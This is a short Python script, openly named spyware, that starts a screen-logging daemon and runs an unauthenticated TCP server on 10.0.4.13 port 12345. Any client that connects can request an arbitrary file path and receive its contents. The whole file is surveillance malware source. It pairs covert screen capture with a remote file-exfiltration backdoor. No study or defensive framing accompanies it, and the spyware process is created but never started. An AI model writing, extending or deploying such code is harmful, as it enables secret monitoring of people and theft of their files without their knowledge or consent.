from SpyWare.ScreenLogger import Daemon, screenConfig
import socket

import multiprocessing
import os
import socket

HOST = '10.0.4.13'
PORT = 12345


def send_file(conn, filename):
    try:
        with open(filename, 'rb') as file:
            data = file.read(1024)
            while data:
                conn.send(data)
                data = file.read(1024)
    except Exception:
        pass


def handle_client_connection(conn):
    command = conn.recv(1024).decode()

    if command == "get_file":
        filename = conn.recv(1024).decode()
        if os.path.exists(filename):
            conn.send(b"File exists")
            send_file(conn, filename)
        else:
            conn.send(b"File not found")
    else:
        conn.send(b"Invalid command")

    conn.close()


def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    while True:
        conn, _ = server_socket.accept()
        handle_client_connection(conn)

    server_socket.close()


def spywaremodule():

    screenConfig(argv=["_", "screenlog.conf"])
    daemon = Daemon()
    daemon.run_for_ever()


if __name__ == '__main__':
    # Multiprocessing
    server_process = multiprocessing.Process(target=start_server)
    server_process.start()
    spyware_process = multiprocessing.Process(target=spywaremodule)
    server_process.join()


